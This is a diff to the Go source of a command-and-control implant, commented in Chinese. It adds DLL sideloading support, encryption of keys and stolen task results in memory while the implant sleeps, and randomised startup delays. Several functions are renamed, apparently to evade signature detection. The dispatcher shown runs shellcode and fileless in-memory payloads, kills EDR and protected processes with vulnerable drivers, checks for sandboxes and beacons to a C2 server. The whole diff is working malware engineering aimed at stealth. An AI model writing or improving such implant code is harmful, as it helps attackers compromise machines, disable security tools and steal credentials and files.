@@ -281,16 +281,30 @@ func loadConfigFromSelf() *implantConfig {
 	return &cfg
 }
 
-func main() {
+// startImplant 植入端主流程（连上 C2 后进入心跳/任务循环，正常情况下不返回）。
+//
+// 单独抽出来是为了 **DLL 载荷**（format=dll，白加黑 / rundll32 侧加载）：
+// c-shared 模式下 Go 不会调用 main()，由生成的 cgo 胶水在 DLL 加载或宿主调用导出
+// 函数时 `go startImplant()` 起一个独立线程跑同一套逻辑（见 builder 的 dll.go）。
+//
+// 注意：整个流程第一件事就是"启动随机延迟"的休眠，这同时保证了**不会在 DLL 加载
+// 的 loader lock 里做重活**（联网/建线程都发生在休眠之后的普通线程上），这是刻意设计。
+func startImplant() {
+	// 生成休眠期掩码密钥（Windows 下启用"休眠期内存加密"，其它平台为空操作）。
+	// 越早调用越好：后面的启动延迟就是第一个长休眠窗口。
+	initSleepMask()
+
 	// 启动默认随机延迟：先休眠 [startupDelayMin, startupDelayMax] 秒（构建期配置，默认 5~30s），
 	// 打乱"启动即连/即行为"的检测节奏，降低主动防御在启动阶段的拦截概率。
+	// 用 maskedSleep 而不是 time.Sleep：这段时间是"静态躺着"的最长窗口，
+	// 内存里不该留明文密钥/结果（见 sleepmask_windows.go）。
 	if startupDelayMax >= startupDelayMin && startupDelayMin > 0 {
 		d := startupDelayMin + int(time.Now().UnixNano()%int64(startupDelayMax-startupDelayMin+1))
-		time.Sleep(time.Duration(d) * time.Second)
+		maskedSleep(time.Duration(d) * time.Second)
 	}
 
 	// 反沙箱/反调试：命中可疑环境时延迟执行（Windows 下有效，其它平台为空操作）
-	evasionInit()
+	initGate()
 
 	// 编译时内嵌的默认值（由 processTemplates 替换）
 	serverAddr = "{{SERVER_URL}}"
@@ -368,6 +382,21 @@ func main() {
 	// 中继角色：relayListen 非空时，除直连 C2 外额外监听子植入体连接（Beacon Mesh）。
 	_ = startRelayListener(relayListen)
 
+	// ── 休眠期内存加密（sleep mask）的注册 ──
+	// 1) 隧道 SM4 子密钥：空闲休眠时一并加密（用它的路径都会先 ensureUnmasked 提前解密）；
+	// 2) 任务结果缓存：里面可能有凭据、文件内容等最敏感的东西，休眠期不该以明文躺着。
+	//    主 AES 密钥不在这里注册：它在 initAES 之后就被零化并置 nil 了，
+	//    剩下的是 cipher.AEAD 内部的密钥表（Go 不可达，无法安全加密）。
+	registerSecret("sm4-tunnel-key", tunnelKey)
+	sleepMaskHook = func(encrypt bool) {
+		_ = encrypt // XOR 对称：加密与还原是同一操作
+		resultCacheMu.Lock()
+		for _, buf := range resultCache {
+			maskBufferInPlace(buf)
+		}
+		resultCacheMu.Unlock()
+	}
+
 	for {
 		// KillDate 自杀检查：到达指定日期后立即退出进程
 		if killDateReached() {
@@ -376,7 +405,8 @@ func main() {
 
 		// WorkingHours 静默休眠：非工作时段不连接、不执行，等下一轮再判断
 		if workHoursValid && !inWorkingHours() {
-			time.Sleep(5 * time.Minute)
+			// 非工作时段：最长的一个空闲窗口，加密敏感内存后再睡（见 sleepmask_*.go）
+			maskedSleep(5 * time.Minute)
 			continue
 		}
 
@@ -405,7 +435,8 @@ func main() {
 		if consecFail < 1<<30 {
 			consecFail++
 		}
-		time.Sleep(time.Duration(wait) * time.Second)
+		// 重连退避：也是空闲窗口，同样走掩码休眠
+		maskedSleep(time.Duration(wait) * time.Second)
 	}
 }
 
@@ -1008,8 +1039,10 @@ func executeAndSendResult(task Task, gen uint64) {
 	resultPayload, _ := json.Marshal(result)
 
 	// 写入结果缓存（供重连补发去重），再发送；传输类任务不入缓存
+	// 注意：休眠加密期间必须存"加密副本"，否则还原时会把发送用的同一块缓冲也 XOR 掉
+	// （maskIfMaskedCopy 就是为此存在的，见 sleepmask_windows.go）。
 	if !isTransferTask(task.TaskType) {
-		cacheResult(task.ID, resultPayload)
+		cacheResult(task.ID, maskIfMaskedCopy(resultPayload))
 	}
 
 	sendResultPayload(resultPayload)
@@ -1517,6 +1550,8 @@ func decompress(data []byte) ([]byte, error) {
 // 避免每帧重复 aes.NewCipher + cipher.NewGCM（含 S-box 扩展与表生成，开销可观）。
 // 密钥可能被尾部配置块覆盖，因此必须在 main() 完成密钥加载后调用。
 func initAES() {
+	// 若正处于加密休眠中，先让它提前解密（否则会把被加密的密钥喂给 aes.NewCipher）
+	ensureUnmasked()
 	aesOnce.Do(func() {
 		if encryptionKey == nil || len(encryptionKey) == 0 {
 			return
@@ -1542,6 +1577,7 @@ func zeroBytes(b []byte) {
 }
 
 func encrypt(data []byte) ([]byte, error) {
+	ensureUnmasked()
 	if aesgcm == nil {
 		return data, nil
 	}
@@ -1551,6 +1587,7 @@ func encrypt(data []byte) ([]byte, error) {
 }
 
 func decrypt(data []byte) ([]byte, error) {
+	ensureUnmasked()
 	if aesgcm == nil {
 		return data, nil
 	}
@@ -1612,10 +1649,10 @@ func executeTask(task Task) Result {
 	case "plugin_dll":
 		output, exitCode, errMsg = loadDLL(task.Data)
 	case "plugin_shellcode":
-		output, exitCode, errMsg = loadShellcode(task.Data)
+		output, exitCode, errMsg = runBlob(task.Data)
 	case "module_stomp":
 		// 模块伪造：shellcode 驻留已签名 DLL .text 空洞后执行（内存隐匿 2.0）
-		output, exitCode, errMsg = stompShellcode(task.Data)
+		output, exitCode, errMsg = carveRun(task.Data)
 	case "fileless_exec":
 		// 全内存无文件执行：shellcode / BOF / DLL 三类载荷均不落盘执行
 		output, exitCode, errMsg = handleFilelessExec(task.Data)
@@ -1672,13 +1709,13 @@ func executeTask(task Task) Result {
 		output, exitCode, errMsg = handleEDRKill(task.Data)
 	case "byovd_load":
 		// BYOVD：加载内核驱动（操作员提供 .sys）
-		output, exitCode, errMsg = handleBYOVDLoad(task.Data)
+		output, exitCode, errMsg = handleDrvLoad(task.Data)
 	case "byovd_unload":
 		// BYOVD：卸载驱动
-		output, exitCode, errMsg = handleBYOVDUnload(task.Data)
+		output, exitCode, errMsg = handleDrvUnload(task.Data)
 	case "byovd_kill":
-		// BYOVD：用内置 kgameprotect 驱动的无鉴权终止 IOCTL 击杀进程（按 PID 或进程名）
-		output, exitCode, errMsg = handleBYOVDKill(task.Data)
+		// 驱动击杀：用操作员自备驱动的终止 IOCTL 击杀进程（按 PID 或进程名）
+		output, exitCode, errMsg = handleDrvKill(task.Data)
 	case "ppl_kill":
 		// PPL 击杀：直接终止失败后走句柄窃取（内置驱动无内核读写，不能改 EPROCESS.Protection）
 		output, exitCode, errMsg = handlePPLKill(task.Data)
@@ -1743,13 +1780,13 @@ func handleFilelessExec(data string) (string, int32, string) {
 
 	switch req.Kind {
 	case "shellcode", "":
-		return loadShellcode(req.PayloadB64)
+		return runBlob(req.PayloadB64)
 	case "bof":
 		return loadBOF(req.PayloadB64, req.Args)
 	case "dll":
 		return loadDLLMem(req.PayloadB64, req.Entry)
 	case "exe_mem":
-		return loadEXEMem(req.PayloadB64, req.Args, req.Entry, req.WaitMs)
+		return runMappedImage(req.PayloadB64, req.Args, req.Entry, req.WaitMs)
 	default:
 		return "", -1, fmt.Sprintf("unsupported fileless kind: %q", req.Kind)
 	}
